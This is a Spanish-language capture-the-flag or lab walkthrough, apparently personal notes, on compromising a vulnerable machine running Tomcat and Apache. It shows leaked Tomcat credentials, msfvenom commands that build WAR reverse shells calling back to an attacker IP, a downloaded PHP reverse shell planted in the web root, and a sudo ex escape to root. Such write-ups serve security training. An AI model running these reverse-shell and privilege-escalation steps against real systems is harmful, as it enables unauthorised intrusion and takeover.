Hacemos el escaneo de nmap:
![[Pasted image 20240101185009.png]]
Y un apache es lo que está corriendo en bajo el puerto 80:
![[Pasted image 20240101185139.png]]
Pero sin embargo por el puerto 8080 vemos que está corriendo un tomcat:
![[Pasted image 20240101185251.png]]
Y por estos enlaces podemos ver un lugar de login:
![[Pasted image 20240101185317.png]]
![[Pasted image 20240101185332.png]]
Pero si hacemos clic en cancel, veremos que se nos redirige a otra ventana donde se nos muestran las credenciales:
```bash
tomcat:s3cret
```
![[Pasted image 20240101185442.png]]
Proporcionamos las credenciales y estamos dentro, donde además se nos muestra que podemos subir un archivo WAR:
![[Pasted image 20240101185536.png]]
Creamos con msfvenom un fichero .war malicioso:
```bash
msfvenom -p java/shell_reverse_tcp LHOST=192.168.0.37 LPORT=443 -f war -o revshell.war
```
![[Pasted image 20240101190014.png]]
Lo subimos y lo tenemos aquí dentro del servidor:
![[Pasted image 20240101185958.png]]
Y vemos que nos da error, porque este payload generado no es el adecuado:
![[Pasted image 20240101190402.png]]
Por lo que generamos otro con msfvenom añadiendo la parte de jsp, que significa JavaServer Pages:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.37 LPORT=443 -f war > reverse.war
```
Lo ejecutamos:
![[Pasted image 20240101190533.png]]
Hacemos un clic en reverse y estamos dentro:
![[Pasted image 20240101190609.png]]
![[Pasted image 20240101190633.png]]
Para la escalada, podemos lanzar un linpeas y nos encuentra un directorio interesante:
![[Pasted image 20240101191332.png]]
Nos ubicamos dentro del directorio de /etc/tomcat9 y vemos estos archivos:
![[Pasted image 20240101190853.png]]
Y si visualizamos el archivo tomcat-users.xml nos encontramos con unas credenciales del usuario sa y con contraseña salala!!:
```bash
sa:salala!!
```
![[Pasted image 20240101190947.png]]
Por lo que entramos por ssh:
![[Pasted image 20240101191303.png]]
Y vemos un usuario llamado toor:
![[Pasted image 20240101191517.png]]
Podemos intentar ver procesos que estén funcionando en segundo plano y asociados con toor:
```bash
ps aux | grep toor
```
![[Pasted image 20240101191647.png]]
Vemos que el usuario toor está levantando un servicio apache http, por lo que podemos ubicarnos dentro de /var/www/html y ahí colarle una reverse shell en php, por ejemplo la de pentestmonkey:
```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
```
![[Pasted image 20240101191835.png]]
Establecemos nuestros datos:
![[Pasted image 20240101191939.png]]
Ahora desde el puerto 80 llamamos a este archivo:
```bash
192.168.0.18/php-reverse-shell.php
```
![[Pasted image 20240101192033.png]]
Y habremos recibido la reverse shell por aquí:
![[Pasted image 20240101192048.png]]
Y ejecutando el comando sudo -l vemos que podemos ejecutar el binario de /ex:
![[Pasted image 20240101192114.png]]
Vemos las instrucciones para escalar privilegios con este binario en la web de gtfobins:
![[Pasted image 20240101192140.png]]
Lo que tenemos que hacer es ejecutar primero sudo ex y luego lanzarnos una sh:
```bash
sudo -u root /usr/bin/ex
!/bin/sh
```
![[Pasted image 20240101192455.png]]
